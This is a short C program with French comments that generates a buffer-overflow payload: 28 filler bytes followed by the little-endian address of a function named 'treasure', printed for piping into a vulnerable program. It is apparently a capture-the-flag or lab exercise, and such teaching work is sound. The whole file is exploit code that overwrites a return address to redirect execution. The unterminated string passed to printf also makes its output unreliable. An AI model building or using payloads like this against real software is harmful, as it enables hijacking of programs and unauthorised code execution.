#include <stdio.h>

int main() {

	int BUFFER_SIZE = 32;

	char input[BUFFER_SIZE];

	// Génère les 28 dummy bytes pour arriver jusqu'à l'endroit où il faut écrire l'adresse
	for(int i = 0; i < BUFFER_SIZE - 4; i++) {
		input[i] = 'A';
	}

	// Ecriture de l'adresse de la fonction treasure
	input[BUFFER_SIZE - 4] = 0x4c;
	input[BUFFER_SIZE - 3] = 0x92;
	input[BUFFER_SIZE - 2] = 0x04;
	input[BUFFER_SIZE - 1] = 0x08;

	printf("%s", input);

	return 0;
}
